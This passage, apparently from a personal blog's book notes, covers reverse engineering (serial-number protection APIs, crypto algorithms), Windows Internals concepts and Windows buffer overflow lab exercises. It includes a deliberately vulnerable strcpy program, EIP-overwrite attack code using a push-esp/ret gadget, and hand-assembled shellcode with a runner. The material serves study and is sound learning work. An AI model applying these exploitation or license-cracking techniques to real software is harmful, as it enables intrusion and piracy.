esp, xxx\nleave: add esp, xxx # pop ebp\n\nWe can rewrite the script aboveenter xxxx, 0   ; Reserver space xxxx for local variable...leaveret 8\n\nEnable Maximum Speed in VC6.0push p2push p1call test2&#123;    mov eax, dword ptr [esp+04]     ; Call parameter 1    mov ecx, dword ptr [esp+08]     ; Call parameter 2    ...    ret 8                           ; return&#125;\nVirtual FunctionChapter 5 - Software Protection Demonstration5.1 - Serial Number and KeyGen\n\n \\text{Serial Number} = F(\\text{Username})\n\n\\text{Username} = F^{-1}(\\text{Serial Number})\n\n F_1(\\text{Username}) = F_2(\\text{Serial Number})\n\n Some value = F(\\text{Username}, \\text{Serial Number})\n\nExploiting Serial Number Protection MechanismCommonly used API functions for Serial Number Protection:\n\nThe following functions are commonly used for input:\nGetWindowTextA(W)\nGetDlgItemTextA(W)\nGetDlgItemInt\nhmencpy (Windows 9x/Me only)\n\n\nThe floowing functions are commonly used for messagebox:\nMessageBoxA(W)\nMessageBoxExA(W)\nShowWindow\nMessageBoxIndirectA(W)\nCreateDialogParamA(W)\nCreateDialogIndirectParamA(W)\nDialogBoxParamA(W)\nDialogBoxIndirectParamA(W)\n\n\nOther functions:\nSerial number might be stored in registry:\nRegQueryValueExA(W)\n\n\nSerial number might be stored in an INI file:\nGetPrivateProfileStringA(W)\nGetPrivateProfileIntA(W)\nGetProfileStringA(W)\nGetProfileIntA(W)\n\n\nSerial number might be stored in other file:\nCreateFileA(W)\n_lopen()\n\n\n\n\n\nKeyFile Protection\n\n\n\nAPI Function\nDescription\n\n\n\n\nFindFirstFileA\n\n\nCreateFileA, _lopen\n\n\nGetFileSize, GetFileSizeEx\n\n\nGetFileAttributesA, GetFileAttributesExA\n\n\nSetFilePointer, SetFilePointerEx\nMov\n\n\nReadFile\nObtain file content.\n\n\n\n\n5.7 - Disk Protection5.8 - Single InstanceChapter 6 - Cryptography Algorithm6.1 - HashingMD5MD5 stands for Message Digest Algorithm 5.\n\nA = 01234567h\\\\\nB = 89abcdefh\\\\\nC = fedcba98h\\\\\nD = 76543210h\\\\\n\\begin{align*}\nF(X,Y,Z) &= (X\\&Y) | ((\\sim X)\\&Z)\\\\\nG(X,Y,Z) &= (X\\&Z) | (Y\\&(\\sim Z))\\\\\nH(X,Y,Z) &= X\\text{\\textasciicircum}Y\\text{\\textasciicircum}Z\\\\\nI(X,Y,Z) &= Y\\text{\\textasciicircum}(X|(\\sim Z))\n\\end{align*}SHASHA stands for Secure Hash Algorithm.\n\nSHA-1\nSHA-256\nSHA-384\nSHA-512\n\n6.2 - Symmetric Encryption\nDES (Data Encryption Standard)\nIDEA (International Data Encryption Algorithm)\nAES (Advanced Encryption Standard)\nBlowFish\nTwoFish\n\nRC4RC4 stands for Rivest Cipher 4.\nKSA (Key-Scheduling Algorithm)RC4-KSA(Key)    for i := 0 to 255 do        S[i] := i    end for    j := 0    for i := 0 to 255 do        j := (j + S[i] + Key[i mod keylength]) mod 256        swap S[i] and S[j]    end for    return S\nPRGA (Pseudo-Random Generation Algorithm)RC4-PRGA(S)    i := 0    j := 0    while true do        i := (i + 1) mod 256        j := (j + S[i]) mod 256        swap S[i] and S[j]        t := (S[i] + S[j]) mod 256        K := S[t]        output K    end while\nTEATEA stands for Tiny Encryption Algorithm.\nTEA_Encrypt(v[2], k[4])&#123;    uint32 v0 = v[0], v1 = v[1];    uint32 sum = 0;    uint32 delta = 0x9E3779B9;    for (i = 0; i &lt; 32; i++)    &#123;        sum += delta;        v0 += ((v1 &lt;&lt; 4) + k[0]) ^ (v1 + sum) ^ ((v1 &gt;&gt; 5) + k[1]);        v1 += ((v0 &lt;&lt; 4) + k[2]) ^ (v0 + sum) ^ ((v0 &gt;&gt; 5) + k[3]);    &#125;    v[0] = v0;    v[1] = v1;&#125;\nTEA_Decrypt(v[2], k[4])&#123;    uint32 v0 = v[0], v1 = v[1];    uint32 delta = 0x9E3779B9;    uint32 sum = delta * 32;    for (i = 0; i &lt; 32; i++)    &#123;        v1 -= ((v0 &lt;&lt; 4) + k[2]) ^ (v0 + sum) ^ ((v0 &gt;&gt; 5) + k[3]);        v0 -= ((v1 &lt;&lt; 4) + k[0]) ^ (v1 + sum) ^ ((v1 &gt;&gt; 5) + k[1]);        sum -= delta;    &#125;    v[0] = v0;    v[1] = v1;&#125;\nWhere:\n\n\\begin{align*}\n\ndelta &= \\frac{\\sqrt{5} - 1}{2} \\times 2^{32}\\\\\n&= (\\sqrt{5} - 1) \\times 2^{31}\n\\end{align*}IDEABlowFishAESChapter 7 - Windows Kernel Fundamentals7.1 - Kernel Fundamentals\n    \n    Source: https://www.linkedin.com/pulse/windows-os-rings-role-event-monitoring-jacob-stickney-thv5c\n    \n\n\n\n7.2 - Important Kernel Data Structure7.3 - Fundamentals of Kernel DebuggingChapter 8 - Windows Exception Handling8.1 - Fundamentals of Exception HandlingVOID RaiseException(  [in] DWORD           dwExceptionCode,  [in] DWORD           dwExceptionFlags,  [in] DWORD           nNumberOfArguments,  [in] const ULONG_PTR *lpArguments);//Source: https://learn.microsoft.com/en-us/windows/win32/api/errhandlingapi/nf-errhandlingapi-raiseexception\nWhen an interrupt or exception occurs, the CPU looks up the corresponding handler in the IDT.\nThe IDT (Interrupt Descriptor Table) is a linear table stored in memory. It consists of 256 entries. Each entry is 8 bytes long on x86 (32-bit) platforms and 16 bytes long on x64 (64-bit) platforms.\nThe base address and size of the IDT are described by the IDTR (IDT Register). The IDTR is 48 bits long on x86 systems. Although the IDTR can be accessed using the SIDT and LIDT instructions, the LIDT instruction can only be executed with Ring 0 privilege.\n8.2 - SEHChapter 9 - Win32 API DebuggingChapter 14 - Vulnerability Techniques14.1 - Software VulnerabilityStack Buffer OverflowHeap Buffer Overflow#include &lt;stdio.h&gt;#include &lt;Windows.h&gt;int main(int argc, char *argv[]) &#123;    char str[] = &quot;\\nHello123456789213456789\\n&quot;;    char *a, *b, *c;    long *hHeap;    hHeap = (long *)HeapCreate(0x00040000, 0, 0);    printf(&quot;\\n(+) Creating a heap at: 0x00%xh\\n&quot;, hHeap);    printf(&quot;(+) Allocating chunk A\\n&quot;);    a = (char *)HeapAlloc(hHeap, HEAP_ZERO_MEMORY, 0x10);    printf(&quot;(+) Allocating chunk B\\n&quot;);    b = (char *)HeapAlloc(hHeap, HEAP_ZERO_MEMORY, 0x10);    printf(&quot;(+) Chunk A=0x00%x\\n(+) Chunk=0x00%x\\n&quot;, a, b);    printf(&quot;(+) Freeing chunk B to the lookaside\\n&quot;);    HeapFree(hHeap, 0, b);    printf(&quot;(+) Now overflow chunk A:\\n&quot;);    printf(&quot;%x\\n&quot;, str);    printf(str);    memcpy(a, &quot;XXXXXXXXXXXXXXXXAAAABBBB\\x64\\xff\\x12\\x00&quot;, 28);    printf(&quot;(+) Allocating chunk B\\n&quot;);    b = (char *)HeapAlloc(hHeap, HEAP_ZERO_MEMORY, 0x10);    printf(&quot;(+) Allocating chunk C\\n&quot;);    c = (char *)HeapAlloc(hHeap, HEAP_ZERO_MEMROY, 0x10);    printf(&quot;(+) Chunk A=0x00%x\\n(+) Chunk B = 0x00%x\\n(+) Chunk C=0x00%x\\n&quot;, a, b, c);    strcpy(c, &quot;AAAAAAAAAAAA\\n&quot;);    printf(str);    return 0;&#125;\n14.2 - ShellcodeCHapter 15 - Software Unpacking15.2 - Packer\nUPX\nASPack\n\n15.3 - Packer Stub\nASProtect\nArmadillo\nEXECryptor\nThemida\n\nTHANKS FOR READING\n","tags":["Book","Note","Cryptography","Reverse Engineering","OllyDbg","WinDbg","Assembly","MD5","AES"]},{"title":"[Book] Windows Internal Part 1","url":"/2026/01/26/2026-1-26-BookWindowsInternal-P1/","content":"El libro\n\n\nIntroductionThis article is used to keep notes and summaries of the book “Windows Internal Part 1”.The content will be continuously updated as I read through the book.\nReflectionChapter 1 - Concepts and ToolsFundation concepts and termsWindows APIThe Windows application programming interface (API) is the user-mode system programming interface to the Windows OS family. Prior to the introduction of 64-bit versions of Windows, the API to the 32-bit versions of the Windows OS was called the Win32 API to distinguish it from the original 16-bit Windows API.\nThe term Windows API refers to both the 32-bit and 64-bit API to Windows.\nWindows API flavorsCOM was originally created to enable Microsoft Office applications to communicate and exchange data between documents (such as embedding an Excel chart inside a Word document or a PowerPoint presentation). This ability is called Object Linking and Embedding (OLE). OLE was originally implemented using an old Windows messaging mechanism called Dynamic Data Exchange (DDE).\nCOM is baed on two foundational principles. First, client communicate with objects (sometimes called COM server object) through interfaces——well-defined contracts with a set of logically related methods grouped under the virtual table dispatch mechanism, wich is also a common way for C++ compilers to implement virtual functions dispatch.The second principle is that component implementation is loaded dynamically rather than being statically linked to the client.\nThe term COM server typically refers to a Dynamic Link Library (DLL) or an executable (EXE) where the COM classes are implemented.\nThe Windows RuntimeWindows 8 introduced a new API and supporting runtime called Windows Runtime (sometimes abbreviated WinRT, not to be confused with Windows RT, the discontinued ARM-based Windows OS version).\nFrom an API perspective, WInRT is built on top of COM, adding various extensions to the base COM infrastructure.\nThe .NET FrameworkThe .NET Framework is part of Windows.\n\n\n\n\nWindows Version\n.NET Framework Version\n\n\n\n\nWindows 8\n4.5\n\n\nWindows 8.1\n4.5.1\n\n\nWindows 10\n4.6\n\n\nWindows 10 version 1511\n4.6.1\n\n\nWindows 10 version 1607\n4.6.2\n\n\n\n\nThe .NET Framework consists of two major components:\n\nThe Common Language Runtime (CLT)\nThe .NET Framework Class Library (FCL)\n\n\n\n\nServices, functions, and routines\nWindows API functions\nNative system service (or system calls)\nKernel support functions (or routines)\n\nProcessesAlthough programs and process appear similar on the surface, they are fundamentally different.\nA program is a static sequence of instructions, whereas a process is a container for a set of resources used when executing the instance of the program.\n\nA private virtual address space\nAn executable program\nA list of open handles\nA security context\nA process ID\nAt least one thread of execution\n\nThreadsA thread is an entity within a process that Windows schedules for execution. Without it, the process’s program can’t run. A thread includes the follow essential components:\n\nThe contents of a set of CPU registers representing the state of the processor\nTwo stacks——one for the thread to use while executing in kernel mode and one for executing in user mode.\nA private storage area called thread-lcoal storage (TLS)* for use by subsystems, run-time libraries, and DLLs.\nA unique identifier called a thread ID (part of an internal structure called a client ID; process IDs and thread IDs are generated out of the same namespace, so they never overlap)\n\nThe threads of a 32-bit application running on a 64-bit version of WIndows will contain both 32-bit and 64-bit context, which Wow64 will use to switch the applicaion from running in 32-bit to 64-bit mode when required. These threads will have two user stacks and two CONTEXT blocks, and the usual Windows API functions will return the 64-bit context instead. The Wow64GetThreadContext function, however, will return the 32-bit context.\nFibersFibers allow an application to schedule its own threads of execution rather than rely on the priority-based scheduling mechanism built into Windows. Fibers are often called lightweight threads. In terms of scheduling, they are invisible to the kernel because they are implementeed in user mode in kernel32.dll. To use fibers, you first make a call to the Windows ConvertThreadToFiber function. This function converts the thread to a running fiber. Afterward, the newly converted fiber can create additonal fibers via the CreateFiber function (Each fiber can have its own set of fibers).\nUser-mode scheduling threadsUser-mode schedulnig (UMS) threads, which are available only on 64-bit versions of Windows, provide the same basic advantages as fibers——and only a few of the disadvantages. UMS threads have their own kernel thread stat and are therefore visible to the kernel, which allows multiple UMS threads to issue blocking system calls and share and contend on resources.\n\n\n\nJobsWindows provides an extension to the process model called a job. A job object’s main function is to allow the management and manipulation of groups of processes as a unit.\nA job object allows control of certain attributes and provides limits for the process or processes associated with the job.\nVirtual Memory\n\n\nWindows implements a virtual memory system based on a flat (linear) address space that provides each process with the illusion of having its own large, private address space.\nVirtual memory provides a logical view of memory that might not correspond to its physical layout.\n\n\n\nKernel mode vs. user modeTo protect user applications from accessing and/or modifying critical OS data, Windows uses two processor access modes (even if the processor on which Windows is running supports more than two): user mode and kernel mode. User application code runs in user mode, whereas OS code (such as system services and device drivers) runs in kernel mode.\nKernel mode refers to a mode of execution in a processor that grants access to all system memory and all CPU instructions.\nAlthough each Windows process has its own private memory space, the kernel-mode OS and device-driver code share a single virtual address space. Each page in virtual memory is tagged to indicate what access mode the processor must be in to read and/or write the page.\nPages in system space can be accessed only from kernel mode, whereas all pages in the user address space are accessible from user mode and kernel mode.\nWindows 10 drivers must be signed by only two of the accepted certification authorities with a SHA-2 Extended Validation (EV) Hwardware certificate instead of the regular file-based SHA-1 certiicate and its 20 authorities.\nHypervisorThe need for fast, efficient, and secure virtualization has driven new models of computing and reasoning about software.\nTo provide such virtualization services, almost all modern solutions employ the use of a hypervisor, which is a specialized and highly privileged component that allows for the virtualization and isolation of all resources on the machine, from virtual to physical memory, to device interrupts, and even to PCI and USB devices.\nIn Windows 10, Microsoft now leverages the Hyper-V hypervisor to provide a new set of services known as virtualization-based security (VBS):\n\nDevice Guard: This provides Hypervisor Code Integrity (HVCI) for stronger code-signing guaratees over KMCS alone, and allows for the custumization of the signature policy of the Windows OS, for both user-mode and kernel mode code.\nHyper Guard: This protects key kernel-related and hypervisor-related data structures and code.\nCredential Guard: This prevents unauthorized access to domain account credentials and secrets, combined with secure biometrics.\nApplication Guard: This provides an even stronger sandbox for the Microsoft Edge browser.\nHost Guardian and Shielded Fabric: These leverage a virtual TPM (v-TPM) to protect a virtual machine from the infrastructure it’s running on.\n\nAdditionally, the Hyper-V hypervisor enables certain key kernel mitigations against exploits and other attackers.\nFirmwareTerminal Services and multiple sessionsTerminal Services refers to the support in Windows for multiple interactive user sessions on a single systerm.\nWith Windows Terminal Services, a remote user can establish a session on another machine, log in, and run applications on the server.\nThe first session is considered the services session, or session zero, and contains system service hosing processes.\nObjects and handlesIn the Windows OS, a kernel object is a single, run-time instance of a statically defined object type. An object type comprises a system-defined data type, functions that operate on instances of the data type, and a set of object attributes.\nThe most fundamental difference between an object and an ordinary data structure is that the internal structure of an object is opaque. You must call an object service to get data out of or put data into an object. You can’t directly read or change data in side an object.\nObjects, through the help of a kernel component called the object manager.\nNot all data structures in the Windows OS are objects. Only data that needs to be shared, protected, named, or made visible to user-mode programs (via system services) is placed in objects. Structures used by only one component of the OS to implement internal functions are not objects.\nSecurityWindows has three forms of access control over objects:\n\nDiscretionary access control: It’s the method by which owners of objects (such as files or printers) grant or deny access to others. With Windows Server 2012 and Windows 8, this form of discretionary control is further improved by implementing attribute-based access control (also called Dynamic Access Control).\nPrivileged access control: This is necessary for those times when discretionary access control is not enough. It’s a method of ensuring that someone can get to protected objects if the owner isn’t available.\nMandatory integrity control: This is required when an additional level of security control is needed to protect objects that are being accessed from within the same user account.\n\nStarting with Windows 8, a sandbox called an AppContainer is used to host Windows Apps, which provides isolation with relation to other AppContainers and non-Windows Apps processes.\nRegistryUnicodeChapter 2 - System architectureOperating system modelArchitecture overviewDespite its pervasive use of objects to represent shared system resources, Windows is not an object-oriented system in the strict sense. Most of the kernel-mdoe OS code is written in C for portability. The C programming language doesn’t directly support object-oriented constructs such as polymorphic functions or class inheritance. Therefore, the C-based implementation of objects in Windows borrows from, but doesn’t depend on, features of particular object-oriented languages.\n\n\n\nThe boexes above the line represent user-mode processes, and the components below the line are kernel-mode OS services.\nA second dividing line between kernel-mode parts of Windwos and the hypervisor is also visible. The hypervisor still runs with the same CPU privilege level (0) as the kernel, but because it uses specialized CPU instructions (VT-x on Intel, SVM on AMD), it can both isolate itself from the kernel while also monitoring it (and applications). Some people may call it ring -1, which is INACCURATE.\nFour basic types of user-mode processes:\n\nUser processes\nService processes\nSystem processes\nEnvironment sybsystem server processes\n\nWindows 10 Version 1607 includes a Windows Sybsystem for Linux (WSL) in beta state for developers only. However, this is not a true subsystem as described in this section.\nNotice the Sybsystem DLLs blox below the Service Processes and User Processes boxes. Under Windows, user applications don’t call the native Windows OS services directly. Rather, they go through on or more subsystem dynamic-link libraries (DLLs). The role of subsystem DLLs is to translate a documented function into the appropriate internal (and generally undocumented) native system service calls implemented mostly in Ntdll.dll.\nThe kernel-mode components of Windows include the following:\n\nExecutive: The Windows executive contains the base OS services, such as memory management, process and thread management, security, I/O, networking, and inter-process communication.\nThe Windows kernel\nDevice drivers: This includes both hardware device drivers, and non-hardware device drivers.\nThe Hardware Abstraction Layer (HAL)\nThe windowing and graphics system\nThe hypervisor layer: This is composed of the hypervisor itself. There are no drivers or other modules in this environment. The hypervisor is itself composed of multiple internal layers and services, such as its own memory manager, virtual processor scheduler, interrupt and timer management, synchronization routines, partitions, IPC and more.\n\nCore Windows System Files:\n\n\n\n\nFile Name\nComponents\n\n\n\n\nNtoskrnl.exe\nExecutive and kernel\n\n\nHal.dll\nHAL\n\n\nWin32.sys\nKernel-mode part of the Windows subsystem (GUI)\n\n\nHvix64.exe (Intel), Hvax64.exe (AMD)\nHypervisor\n\n\n.sys file in \\SystemRoot\\System32\\Drivers\nCore driver files, such as Direct X, Volume Manager, TCP/IP, TPM, andACPI supprot.\n\n\nNtdll.dll\nInternal support functions and system service dispatch stubs to executive functions\n\n\nKernel32.dll, Advapi32.dll, User32.dll, Gdi32.dll\nCore Windows subsystem DLLs.\n\n\n\n\nPortabilityWindows archives portability accross hardware architectures and platforms in two primary ways:\n\nBy using layered design\nBy using C\n\nSymmetric multiprocessingWindows is a symmetric multiprocessing (SMP) OS. There is no master processor——the OS as well as user threads can be scheduled to run on any processor. Also, all the processors share just one memory space. This module contrasts with asymmetric multiprocessing (ASMP), in which the OS typically selects one processor to execute OS kernel code while other processors run only user code.\n\n\n\nWindows also supports four modern types of multiprocessor system: multicore, simultaneous multi-threaded (SMT), heterogeneous, and non-uniform memory access (NUMA).\nScalabilityDifferences between client and server versionsChecked buildVirtualization-based security architecture overviewThe separation between user mode and kernel mode provides protection for the OS from user-mode code, whether malicious or not.\n\n\n\nHere VBS stands for Virtualization-Based Security. VTL stands for Virtual Trust Levels.\nThe user/kernel code is running on top of a Hyper-V hypervisor. The difference is that with VBS enabled, a VTL of 1 is now present, which contains its own secure kernel running in the privileged processor mode (that is, ring 0 on x86/x64).\nSimilarly, a run-time user environment mode, called the Isolated User Mode (IUM), now exists, which runs in unprivileged mode (that is, ring 3).\nKey system componentsThe role of an environment subsystem is to expose some subset of the base Windows executive system services to application programs.\nUser applications don’t call Windows system services directly. Instead, they go through one or more subsystem DLLs. These libraries export the documented interface that the programs linked to that subsystem can called.\nExecutiveThe executive includes the following types of functions:\n\nFunctions that are exported and callable from user mode: These functions are called system services and are exported via Ntdll.dll\nDevice driver functions that are called through the DeviceIoControl function\nFunctions that can be called only from kernel mode that are exported and documented in the WDK\nFunctions that are defined as global symbols but are not exported\nFunctions that are internal to a module that are not defined as global symbols\n\nKernelThe kernel consists of a set of functions in Ntoskrnl.exe that provides fundamental mechanisms. THese include thread-scheduling and synchronization services, used by the executive components, and low-level hardware architecture——dependent support, such as interrupt and exception dispatching, which is different on each processor architecture.\nThe kernel provides a low-level based of well-defined, predictable OS primitives and mechanisms that allow higher-level components of the executive to do what they need to do.\nHALDevice DriversSystem ProcessesChapter 3 - Processes and jobs\nCreateProcess\nCreateProcessAsUser: If a different token is required.\nCreateProcessWithTokenW (advapi32.dll)\nCreateProcessWithLogonW (advapi32.dll)\nSlrCreateProcessWithLogon\n\n\n\n\n","categories":["Book"]},{"title":"[Book] Windows Security Practice - Buffer Overflow","url":"/2026/01/02/2026-1-2-NoteWindowsBufferOverflow/","content":"El libro\n\n\nIntroductionThis article is used to keep notes and summaries of the book “Windows Security Practice - Buffer Overflow”.The content will be continuously updated as I read through the book.\nReflectionFinally, I have completed this book. I had wanted to read through it for a long time, but I was unable to do so for personal reasons.\n\n\n\nAfter reading the book Reverse Engineering Core (리버스 엔지니어링 핵심 원리) Click Me!, I now have a deeper understanding of buffer overflows and the PE file format.\nThis book is recommended for those who want to study Windows buffer overflow techniques. I suggest that readers have a fundamental understanding of assembly language, C/C++, and reverse engineering.\nThere are some typos in this book. In addition, some practical exploitation experiments are difficult to replicate, as it is hard to find the vulnerable applications online (some of the URLs are no longer valid). However, if you want to learn buffer overflow techniques—from Windows XP to Windows 10, and from applications without any protections to those with ASLR and DEP—this book is still suitable for you.\nChapter 1 - Set Up1.1 - VM and Windos XP SP31.2 - ToolsDev-C++According to the author, Dev-C++ is not recommended for software development. However, it is recommended for learning buffer overflow, as it produces executables with simpler structures.\n\nhttps://sourceforge.net/projects/orwelldevcpp/\n\nVisual C++ 2010 ExpressVisual C++ 2013 ExpressNASMNASM stands for The Netwide Assembler.\nOllyDbgWinDbgImmunity DebuggerCFF ExplorerHxDProcess ExplorerMetasploitChapter 2 - Change the Procedure of a Program2.2 - Change the Procedure of a Program via Buffer Overflow//File name: simplec001.c#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;void func(char *str) &#123;\tchar buffer[24];\tint *ret;\tstrcpy(buffer, str);&#125;int main(int argc, char** argv) &#123;    int x = 0;    x = 0;    func(argv[1]);    x = 1;    printf(&quot;x is 1\\n&quot;);    printf(&quot;x is 0\\n&quot;);        system(&quot;pause&quot;);&#125;\n2.3 - Debugging with OllyDbg\n\n\n\n\n\n\n\n\n&gt; gdb --args SimpleC001.exe meaningless(gdb) disassemble func(gdb) disassemble main\n\n\n\n\nEAX: Accumulator Register\nECX: Counter Register\nEDX: Data Register\nEBX: Base Register\nESP: Stack Pointer\nEBP: Base Register\nESI: Source Index\nEDI: Destination Index\nEIP: Instruction Pointer\n\nHere “E” stands for Extended.\n\n\n\n\n\n\n\n\n\n\n\n\n\nModifying the address:\n\n\\begin{align*}\n0x00401548 + 0x00000014 = 0x0040155C\n\\end{align*}*((int*)(buffer+0x20+0x4)) += 0x14;\n\n\n\n\n\n\n\n\n\nNotice that the value 0x14 and 0x20 are depend on your OS.\n2.4 - Basic Buffer OverflowCode (You may remove system(&quot;pause&quot;);):#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;void func(char *str) &#123;\tchar buffer[24];\tint *ret;\tstrcpy(buffer, str);&#125;int main(int argc, char** argv) &#123;    int x = 0;    x = 0;    func(argv[1]);    x = 1;    printf(&quot;x is 1\\n&quot;);    printf(&quot;x is 0\\n&quot;);&#125;Don’t forget to recompile your code.\nNow we need to cause the program to crash. Before doing so, we need to configure OllyDbg:\n\n\n\n\n\n\nHere, we input 48 characters of ‘A’ and then execute the program. As a result, the program is crashed:\n\n\n\nNotice the hexadecimal representation of letter A is 0x41. From the register window of OllyDbg, EIP is overwritten by letter A.\nIf the input string can overwrite the EIP register, then the program has a buffer overflow vulnerability.\nA buffer overflow does not necessarily exist in every program. Even if it exists, it is not always exploitable. Exploitability depends on the environment, register states, memory layout, and operating system protections.\n\nIn this example we are going to attack the vulnerable simplec001.exe from previous section (Notice that we use C++ in this example)://File name: attack-simplec001.cpp#include &lt;string&gt;#include &lt;sstream&gt;#include &lt;cstdlib&gt;using namespace std;int main(int argc, char* argv[]) &#123;\tstring simplec001(argv[1]);\tstring buffer_overflow(40, &#x27;A&#x27;);\tostringstream sout;\t\tsout &lt;&lt; &#x27;\\&quot;&#x27; &lt;&lt; simplec001 &lt;&lt; &quot;\\&quot; &quot; &lt;&lt; buffer_overflow;\tsystem(sout.str().c_str());\t\tsystem(&quot;pause&quot;);&#125;\n\n\n\n\n\n\n\n\n\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB\nAgain, the input string length depends on OS.\n\n\nHere, we have been successfully overwritten EIP with letter B. Notice that the hexadecimal representation of letter B is `0x42`\n\n\n## 2.5 - Basic Shellcode\n\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBCCCC\n\n\n\nHere, we modified the value of both EBP and EIP. Notice that the hexadecimal representation of letter C is `0x43`.\n\n---\nWe obtain the opcodes with WinDbg:\n0:000&gt; a\n\n\n\n\nWrite assembly code. Press enter with empty command to exit.77441b52 push esp77441b53 retn77441b54 \n\n\n\n\nSearch 54 and c3 in msvcrt.dll(755f0000~756af000)0:000&gt; s 755f0000 756af000 54 c3\n\n\n\nHence, we can the value 75687448 to overwrite EIP. Consequently, CPU jumps to 75687448 and executes 54 c3 (push esp and ret).\nThe following code is our attacking code:#include &lt;string&gt;#include &lt;sstream&gt;#include &lt;cstdlib&gt;using namespace std;int main(int argc, char* argv[]) &#123;\tstring simplec001(argv[1]);\tstring junk(32, &#x27;A&#x27;);\tstring ebp(4, &#x27;B&#x27;);\tstring eip(&quot;\\x48\\x74\\x68\\x75&quot;); // msvcert.dll 75687448, push esp # retn\tstring insructions(&quot;\\xcc\\xcc\\xcc\\xcc&quot;);\tostringstream sout;\t\tsout &lt;&lt; &#x27;\\&quot;&#x27; &lt;&lt; simplec001 &lt;&lt; &quot;\\&quot; &quot; &lt;&lt; buffer_overflow;\tsystem(sout.str().c_str());\t\tsystem(&quot;pause&quot;);&#125;\n\nTo avoiding the invalid address value in EBP:\n#include &lt;string&gt;#include &lt;sstream&gt;#include &lt;cstdlib&gt;using namespace std;int main(int argc, char* argv[]) &#123;\tstring simplec001(argv[1]);\tstring junk(32, &#x27;A&#x27;);\tstring ebp(4, &#x27;B&#x27;);\tstring eip(&quot;\\x48\\x74\\x68\\x75&quot;); // msvcert.dll 75687448, push esp # retn\tstring instructions;\tinstructions +=\t\t&quot;\\xc7\\xc5\\x77\\x77\\x77\\x77&quot;\t// MOV, EBP, 0x77777777\t\t&quot;\\xc7\\xc1\\xdf\\x89\\x16\\x77&quot;\t// MOV ECX,0X771689DF\t\t&quot;\\x33\\xe9&quot;\t\t\t\t\t// XOR EBP,ECX\t\t&quot;\\xc7\\xc0\\x77\\x77\\x77\\x77&quot;\t// MOV EAX, 0x77777777\t\t&quot;\\xc7\\xc1\\x2b\\x62\\x37\\x77&quot;\t// MOV ECX,0x7737622B\t\t&quot;\\x33\\xc1\\x42&quot;\t\t\t\t// XOR EAX, ECX # INC EDX\t\t&quot;\\xff\\xe0\\x42&quot;;\t\t\t\t// JMP EAX # INC EDX\tostringstream sout;\t\tsout &lt;&lt; &#x27;\\&quot;&#x27; &lt;&lt; simplec001 &lt;&lt; &quot;\\&quot; &quot; &lt;&lt; junk &lt;&lt; ebp &lt;&lt; eip &lt;&lt; instructions;\tsystem(sout.str().c_str());\t\tsystem(&quot;pause&quot;);&#125;\n\nChapter 3 - Change the Action of a Program3.2 - From C Language to Shellcode#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;int main() &#123;\tprintf(&quot;Hello, World\\n&quot;);\texit(0); &#125;\n\n\n\n\n\n\nConvert “Hello, World!\\n” into hexadecimal format:&gt; python&gt;&gt;&gt; &quot;Hello, World!\\n&quot;.encode(&#x27;utf-8&#x27;).hex()&#x27;48656c6c6f2c20576f726c64210a&#x27;48 65 6C 6C6F 2C 20 576F 72 6C 6421 0AAssembly code:PUSH 0x210A0000PUSH 0x6F2C2057PUSH 0x6F726C64PUSH 0x48656C6CPUSH ESPBecause little-endian is used in memory, the addresses must be reversed. Completed code:PUSH 0x00000A21PUSH 0x646C726FPUSH 0x57202C6FPUSH 0x6C6C6548PUSH ESPMOV ECX,0x75669E20  ; Load 75669E20 into ECX. This is the address of printf()CALL ECX            ; Call printf()XOR EAX,EAX         ; Load 0 into EAXPUSH EAX            ; Load 0 into [ESP] for exit()MOV ECX,0x75656690  ; Load 75656690 into ECX. This is the address of exit()CALL ECX            ; Call exit()\n3.3 - Using Plugin to Obtain ShellcodeWe use mona and Immunity Debugger to obtain the hexadecimal shellcode.\n\nhttps://github.com/corelan/mona\n\n!mona assemble -s PUSH 0x00000A21 # PUSH 0x646C726F # PUSH 0x57202C6F # PUSH 0x6C6C6548 # PUSH ESP # MOV ECX,0x75669E20 # CALL ECX # XOR EAX,EAX # PUSH EAX # # MOV ECX,0x75656690 # CALL ECX\n\n\n\n\n\n\nFull opcode:\\x68\\x21\\x0a\\x00\\x00\\x68\\x6f\\x72\\x6c\\x64\\x68\\x6f\\x2c\\x20\\x57\\x68\\x48\\x65\\x6c\\x6c\\x54\\xc7\\xc1\\x20\\x9e\\x66\\x75\\xff\\xd1\\x33\\xc0\\x50\\xc7\\xc1\\x90\\x66\\x65\\x75\\xff\\xd1\n//TestShellcode.cpp#include &lt;cstdio&gt;using namespace std;char shellcode[] =&quot;\\x68\\x21\\x0a\\x00\\x00&quot;\t\t//PUSH 0x00000A21&quot;\\x68\\x6f\\x72\\x6c\\x64&quot;\t\t//PUSH 0x646C726F&quot;\\x68\\x6f\\x2c\\x20\\x57&quot;\t\t//PUSH 0x57202C6F&quot;\\x68\\x48\\x65\\x6c\\x6c&quot;\t\t//PUSH 0x6C6C6548&quot;\\x54&quot;\t\t\t\t\t\t//PUSH ESP&quot;\\xc7\\xc1\\x20\\x9e\\x66\\x75&quot;\t//MOV ECX,0x75669E20&quot;\\xff\\xd1&quot;\t\t\t\t\t//CALL ECX   &quot;\\x33\\xc0&quot;\t\t\t\t\t//XOR EAX,EAX&quot;\\x50&quot;\t\t\t\t\t\t//PUSH EAX &quot;\\xc7\\xc1\\x90\\x66\\x65\\x75&quot;\t//MOV ECX,0x75656690&quot;\\xff\\xd1&quot;;\t\t\t\t\t//CALL ECX typedef void (*FUNCPTR) ();int main() &#123;\tprintf(&quot;Starting to execute shellcode:\\n&quot;);\tFUNCPTR fp = (FUNCPTR)shellcode;\tfp();\t\tprintf(&quot;This line will not be displayed since we call exit()&quot;);&#125;\n\n\n\n\n\n\n3.4 - Using nasm_shell.rb from Metasploit to Obtain Shellcode\nhttps://github.com/fishstiqz/nasmshell\n\n\n\n\n3.5 - Using NASM to Obtain Shellcode//fonReadbin.cpp#include &lt;iostream&gt;#include &lt;fstream&gt;#include &lt;vector&gt;#include &lt;algorithm&gt;#include &lt;iomanip&gt;using namespace std;typedef vector&lt;unsigned char&gt; BinaryArray;void usage();bool read_binary(ifstream&amp;, BinaryArray&amp;);unsigned output_hex(BinaryArray const&amp;, unsigned const);int main(int argc, char* argv[]) &#123;\tif (argc &lt; 2) &#123;\t\tusage();\t\treturn -1;\t&#125;\t\tifstream fin(argv[1], ios_base::binary);\tif (!fin) &#123;\t\tcerr 